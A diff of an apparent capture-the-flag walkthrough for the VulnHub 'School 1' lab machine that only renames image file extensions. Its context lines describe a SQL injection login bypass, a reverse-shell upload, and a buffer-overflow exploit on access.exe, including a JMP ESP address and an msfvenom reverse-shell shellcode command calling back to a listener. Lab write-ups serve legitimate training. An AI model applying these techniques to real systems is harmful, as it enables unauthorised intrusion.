@@ -14,7 +14,7 @@ You’ll find this vm here :  `https://www.vulnhub.com/entry/school-1,613/`
 - Nmap found three open ports: `22`, `23` and `80`
 - For now let's focus on port `80`
 
-![image](/assets/img/school/1.png)
+![image](/assets/img/school/1.PNG)
 
 #### Login | SQL injection
 
@@ -25,34 +25,34 @@ You’ll find this vm here :  `https://www.vulnhub.com/entry/school-1,613/`
   Password : blahblah
 {% endhighlight %}
 
-![image](/assets/img/school/2.png)
+![image](/assets/img/school/2.PNG)
 
 - We are logged in as admin
 
-![image](/assets/img/school/3.png)
+![image](/assets/img/school/3.PNG)
 
 #### Reverse Shell
 
 - `view-source:http://10.0.2.110/student_attendance/index.php?page=home`
 
-![image](/assets/img/school/4.png)
+![image](/assets/img/school/4.PNG)
 
 - There is in comments the `index.php?page=site_settings`
 - Let's check it
 
-![image](/assets/img/school/5.png)
+![image](/assets/img/school/5.PNG)
 
 - This form allows to upload a file
 - We will try to upload the Reverse Shell
 
-![image](/assets/img/school/6.png)
+![image](/assets/img/school/6.PNG)
 
-![image](/assets/img/school/7.png)
+![image](/assets/img/school/7.PNG)
 
 - After success uploading of the reverse shell
 - open your listener and reload the `http://10.0.2.110/student_attendance/index.php?page=site_settings`
 
-![image](/assets/img/school/8.png)
+![image](/assets/img/school/8.PNG)
 
 #### Finding processes
 
@@ -68,11 +68,11 @@ You’ll find this vm here :  `https://www.vulnhub.com/entry/school-1,613/`
 
 - The `access.exe` is a windows application and running as root
 
-![image](/assets/img/school/9.png)
+![image](/assets/img/school/9.PNG)
 
 - Also the `access.exe` is the application that is running on port `23`
 
-![image](/assets/img/school/10.png)
+![image](/assets/img/school/10.PNG)
 
 - Download the `access.exe` and the `funcs_access.dll`
 
@@ -95,7 +95,7 @@ Attackers exploit buffer overflow issues by overwriting the memory of an applica
 
 #### Structure of the stack
 
-![image](/assets/img/school/11.png)
+![image](/assets/img/school/11.PNG)
 
 - `Extended Stack Pointer (ESP)`
 
@@ -117,12 +117,12 @@ EIP denotes the address of next instruction has to be executed into the stack.
 
 Ιn the image below we can see the sequence of A's did not escape the buffer space. Therefore there is no buffer overflow vulnerability.
 
-![image](/assets/img/school/buffer1.png)
+![image](/assets/img/school/buffer1.PNG)
 
 
 Ιn the second image below we can see the sequence of A's have escaped the buffer space and have reached the EIP. Therefore there a buffer overflow vulnerability. Gaining control of the EIP is very dangerous because, the attacker can use the pointer to point to malicious code and spawn a reverse shell.
 
-![image](/assets/img/school/buffer2.png)
+![image](/assets/img/school/buffer2.PNG)
 
 #### Fuzzing
 
@@ -130,11 +130,11 @@ The first step in buffer overflow is `fuzzing`. Fuzzing allows us to send bytes 
 
 - `One second before running the script`
 
-![image](/assets/img/school/12.png)
+![image](/assets/img/school/12.PNG)
 
 - `After running the script`
 
-![image](/assets/img/school/13.png)
+![image](/assets/img/school/13.PNG)
 
 Okay, the system crashed at 2000 bytes, as we saw in the image before we can overwrite the EIP ``(41414141 = AAAA)``.
 The overwrite is between 1 and 2000 bytes. I will use the `msf-pattern_create` and `msf-pattern_offset` tools to find the exact size at which the EIP was overwritten.
@@ -153,21 +153,21 @@ Creating the pattern with 2000 bytes length
  msf-pattern_create -l 2000 -s ABCDEFGHIKL,alienum,123456789
 {% endhighlight %}
 
-![image](/assets/img/school/14.png)
+![image](/assets/img/school/14.PNG)
 
 - Sending the pattern
 
-![image](/assets/img/school/15.png)
+![image](/assets/img/school/15.PNG)
 
 - Calculating the exact length
 
-![image](/assets/img/school/16.png)
+![image](/assets/img/school/16.PNG)
 
 - The exact match was found at `1902` bytes.
 
 #### Confirm the EIP control
 
-![image](/assets/img/school/17.png)
+![image](/assets/img/school/17.PNG)
 
 The value of the EIP successfully overwritted with four B's = 42424242, so EIP control confirmed
 
@@ -175,13 +175,13 @@ The value of the EIP successfully overwritted with four B's = 42424242, so EIP c
 
 Some characters can cause issues in the development of exploits. I will send at once every hex value of ASCII characters to the access.exe to see if any character cause issues.
 
-![image](/assets/img/school/18.png)
+![image](/assets/img/school/18.PNG)
 
 The letter M = `\x4d` (hex) is a bad char so let's remove it from our `badchars` variable and rerun the script **We will repeat that proccess until bad chars not found.**
 
 - I will run it one more time for example
 
-![image](/assets/img/school/19.png)
+![image](/assets/img/school/19.PNG)
 
 The second bad char was the letter O = `\x4f` (hex). We will remove it from our `badchars` variable and we will rerun the script.
 
@@ -193,7 +193,7 @@ As i read, we don't need to give to the <span style="color:powderblue;">EIP</spa
        The instruction <span style="color:powderblue;">JMP ESP</span> will jump to the stack pointer and execute our malicious shellcode.
        So, If we can find the JMP ESP instruction in the program, we can give its memory address to the EIP and it will jump to automatically to our malicious shellcode.
 
-![image](/assets/img/school/20.png)
+![image](/assets/img/school/20.PNG)
 
 #### Finding the address of the JMP ESP
 
@@ -202,22 +202,22 @@ As i read, we don't need to give to the <span style="color:powderblue;">EIP</spa
 Remember we downloaded from the school machine the access.exe and the funcs_access.dll<br>
       Their location was under /opt/access/
 
-![image](/assets/img/school/21.png)
+![image](/assets/img/school/21.PNG)
 
 - Search for -> All commands
 
-![image](/assets/img/school/22.png)
+![image](/assets/img/school/22.PNG)
 
 - Type : JMP ESP
 
-![image](/assets/img/school/23.png)
+![image](/assets/img/school/23.PNG)
 
 - We found 2 addresses, let's use one of them
 
 address 1 : 625012D0<br>
 address 2 : 625012DD
 
-![image](/assets/img/school/24.png)
+![image](/assets/img/school/24.PNG)
 
 Remember the system understand the addresses using little endian. <br>
 So, the `\xD0\x12\x50\x62` stands for `625012D0`
@@ -228,11 +228,11 @@ We will modify the script to check if the EIP call successfully the address of t
 
 - Toggle `Breakpoint` to the `JMP ESP` address
 
-![image](/assets/img/school/25.png)
+![image](/assets/img/school/25.PNG)
 
 - Run the script
 
-![image](/assets/img/school/26.png)
+![image](/assets/img/school/26.PNG)
 
 We triggered the breakpoint. Therefore, the EIP call successfully the address of the Instruction JMP ESP.
 
@@ -248,12 +248,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.106 LPORT=4444 -f python -a x
 
 - The null byte char \x00 by default is a bad char so we add it to our badchars list (-b)
 
-![image](/assets/img/school/27.png)
+![image](/assets/img/school/27.PNG)
 
 - Now we will add the shellcode into our script
 
-![image](/assets/img/school/28.png)
+![image](/assets/img/school/28.PNG)
 
 #### Rooted
 
-![image](/assets/img/school/29.png)
+![image](/assets/img/school/29.PNG)
